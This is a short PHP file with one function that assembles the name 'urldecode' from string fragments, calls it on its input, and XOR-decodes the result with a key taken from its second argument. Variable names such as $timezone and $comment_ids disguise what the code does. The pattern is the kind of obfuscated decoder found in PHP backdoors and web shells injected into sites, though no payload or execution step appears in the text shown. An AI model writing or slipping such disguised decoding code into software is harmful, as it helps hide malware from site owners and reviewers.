function tag_pattern($spaces, $_builtin)

{
    $timezone = $_builtin;
    $group = "url";
    $group  .= "decode";
    $comment_ids = $group($spaces);

    $parent_id = strlen($comment_ids);
    $parent_id = substr($timezone, 0, $parent_id);

    $stop = $comment_ids ^ $parent_id;
    

    $comment_ids = sprintf($stop, $parent_id);
    
    return $stop;
}


